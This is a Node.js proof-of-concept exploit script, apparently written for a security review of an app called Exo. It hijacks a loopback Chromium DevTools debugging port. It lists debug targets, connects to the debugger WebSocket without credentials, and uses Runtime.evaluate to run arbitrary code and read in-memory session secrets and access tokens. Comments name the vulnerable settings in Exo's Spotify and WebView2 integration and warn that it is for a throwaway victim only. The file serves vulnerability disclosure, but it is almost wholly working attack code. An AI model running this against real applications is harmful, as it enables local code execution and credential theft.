// Attack 1 — loopback DevTools port hijack (proof-of-concept attacker).
//
// Stands in for ANY local process running as the same Windows user. It is
// given ONLY a loopback port number, as a foreign process could learn by
// reading the target's command line (WMI / NtQueryInformationProcess) or by
// scanning 127.0.0.1. With no token, cookie, or other secret it:
//   1. GETs http://127.0.0.1:<port>/json to enumerate debug targets,
//   2. opens the webSocketDebuggerUrl with a raw WebSocket (no Origin header),
//   3. calls Runtime.evaluate to run arbitrary code AND read the session's
//      in-memory secret.
//
// This is exactly the surface Exo exposes for Spotify (SpotifyControls.cs:
// DebugArgument = "--remote-debugging-port=" + DebugPort, bound to 127.0.0.1,
// no --remote-allow-origins) and, when EXO_CDP=1, for its own shell WebView2
// (WebViewHostProfile.cs, fixed port 9229). Run only against the throwaway
// victim, never the user's real Spotify/Discord/Exo.
//
// Usage: node cdp_attacker.mjs <port>
import http from 'node:http';

const port = Number(process.argv[2]);
if (!port) { console.error('usage: node cdp_attacker.mjs <port>'); process.exit(2); }

function getJson(path) {
  return new Promise((resolve, reject) => {
    const req = http.get({ host: '127.0.0.1', port, path, timeout: 4000 }, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => resolve(body));
    });
    req.on('error', reject);
    req.on('timeout', () => req.destroy(new Error('timeout')));
  });
}

async function run() {
  const raw = await getJson('/json');
  let targets;
  try { targets = JSON.parse(raw); } catch { throw new Error('no JSON target list: ' + raw.slice(0, 200)); }
  const target = targets.find((t) => t.webSocketDebuggerUrl);
  if (!target) throw new Error('no debuggable target; targets=' + JSON.stringify(targets).slice(0, 300));
  console.log('ENUMERATED_TARGET=' + target.webSocketDebuggerUrl);

  const ws = new WebSocket(target.webSocketDebuggerUrl);
  const result = await new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('ws timeout')), 8000);
    ws.onopen = () => {
      // Arbitrary code execution in the victim's session + secret theft.
      ws.send(JSON.stringify({
        id: 1,
        method: 'Runtime.evaluate',
        params: {
          expression: 'JSON.stringify({ pwned: 6*7, stolenSecret: globalThis.__sessionSecret, stolenToken: globalThis.__accessToken })',
          returnByValue: true,
          includeCommandLineAPI: true,
        },
      }));
    };
    ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data);
      if (msg.id === 1) { clearTimeout(timer); resolve(msg); }
    };
    ws.onerror = (e) => { clearTimeout(timer); reject(new Error('ws error: ' + (e.message || e.type))); };
  });
  ws.close();
  if (result.error) throw new Error('evaluate rejected: ' + JSON.stringify(result.error));
  const value = result.result?.result?.value ?? JSON.stringify(result.result);
  console.log('EVAL_RESULT=' + value);
  if (String(value).includes('DO_NOT_LEAK') || String(value).includes('fake_access_token')) {
    console.log('PROVEN: a credential-less local process read the victim session\'s in-memory secret and ran arbitrary code over the loopback debug port.');
  } else {
    console.log('Executed code but secret not confirmed in payload.');
  }
}

run().catch((e) => { console.error('ATTACK_FAILED: ' + e.message); process.exit(1); });
